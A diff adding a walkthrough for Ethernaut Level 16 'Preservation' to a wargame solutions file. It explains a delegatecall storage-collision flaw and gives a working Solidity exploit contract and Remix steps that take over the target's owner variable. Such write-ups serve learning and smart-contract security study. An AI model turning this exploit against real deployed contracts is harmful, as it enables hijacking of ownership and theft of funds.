@@ -886,3 +886,73 @@ If the balance is `0`, the level is successfully completed.
 
 ## Level Completed
 ![Level Complete Output](assets/naughtcoin.png)
+
+
+# Ethernaut Level 16: Preservation
+
+## Strategy
+
+- **Vulnerability**: The `Preservation` contract uses `delegatecall` to external libraries. Because `delegatecall` preserves the calling contract's storage, it's possible to overwrite the `owner` variable if the malicious contract mimics the original storage layout.
+- **Exploit**: 
+  - Use the `setFirstTime()` function to overwrite `timeZone1Library` with the address of a malicious contract.
+  - Then use `setFirstTime()` again, which triggers a `delegatecall` to our malicious `setTime()` and overwrites the `owner`.
+
+---
+
+## Remix Deployment Steps
+
+### 1. Deploy the `Hack` contract in Remix
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IPreservation {
+    function owner() external view returns (address);
+    function setFirstTime(uint256) external;
+}
+
+contract Hack {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function attack(IPreservation target) external {
+        // Step 1: Overwrite timeZone1Library with this contract
+        target.setFirstTime(uint256(uint160(address(this))));
+        // Step 2: Call again to overwrite owner
+        target.setFirstTime(uint256(uint160(msg.sender)));
+    }
+
+    function setTime(uint256 _owner) public {
+        owner = address(uint160(_owner));
+    }
+}
+```
+
+This contract mimics the storage layout of `Preservation` and uses `delegatecall` to hijack ownership.
+
+---
+
+### 2. Call `attack()` with the target `Preservation` contract address
+
+```
+hack.attack("0xPreservationContractAddress")
+```
+
+Executes the two-step overwrite of `timeZone1Library` and then `owner`.
+
+---
+
+### 3. Verify Ownership Change
+
+```
+await contract.owner()
+```
+
+**Expected Output**:Your wallet address, proving the hack was successful.
+
+---
+
+## Level Completed
+![Level Complete Output](assets/level16-preservation-success.png)
